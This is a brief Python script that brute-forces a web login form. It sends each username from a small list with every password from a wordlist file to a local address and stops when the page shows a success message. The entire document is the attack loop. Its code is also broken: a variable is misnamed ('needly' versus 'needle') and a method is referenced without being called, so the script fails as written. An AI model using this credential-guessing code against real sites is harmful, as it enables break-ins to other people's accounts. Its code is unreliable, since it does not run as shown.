import requests
import sys

target = "http://127.0.0.1:80"
usernames = ["admin", "user", "test"]
passwords = "passes.txt"
needly = "Welcome back"

for username in usernames:
    with open(passwords, "r") as password_list:
        for password in password_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting {}:{} \r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("No password found for {}".format(username))
        sys.stdout.write("\n")

        
